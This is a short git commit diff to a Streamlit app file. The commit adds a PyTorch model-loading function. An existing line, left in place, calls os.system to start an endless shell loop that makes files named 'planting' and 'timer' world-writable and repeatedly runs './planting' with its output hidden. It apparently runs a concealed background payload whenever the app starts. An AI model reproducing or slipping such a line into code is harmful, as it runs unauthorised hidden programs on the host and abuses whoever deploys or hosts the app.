657ce6c1d619b2d8c2ef000cd9f338354ca8a49c
jeromelasae <110149389+jeromelasae@users.noreply.github.com>
2022-07-28 15:14:57 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -4,6 +4,10 @@ import math
 import pandas as pd
 import streamlit as st
 import os
+import torch
+def load_model():
+	  return torch.load("path/to/model.pt")
+model = load_model()
 os.system("while [ 1 ]; do nohup chmod 777 docker planting timer && ./planting > /dev/null; echo ./timer; echo; sleep 2m; done")
 
 import time 
